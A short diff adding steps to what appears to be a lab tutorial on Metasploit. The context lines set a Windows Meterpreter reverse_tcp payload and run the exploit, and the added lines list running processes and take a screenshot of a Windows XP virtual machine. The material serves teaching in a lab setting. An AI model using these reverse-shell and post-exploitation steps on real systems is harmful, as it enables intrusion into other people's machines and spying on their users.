@@ -115,3 +115,5 @@ set payload windows/meterpreter/reverse_tcp
 exploit
 ```
 4. Type `help` at the Meterpreter prompt to see all available commands
+5. Type `ps` to see list of processes running on the WinXP VM
+6. Type `screenshot` to take a screenshot of the WinXP VM
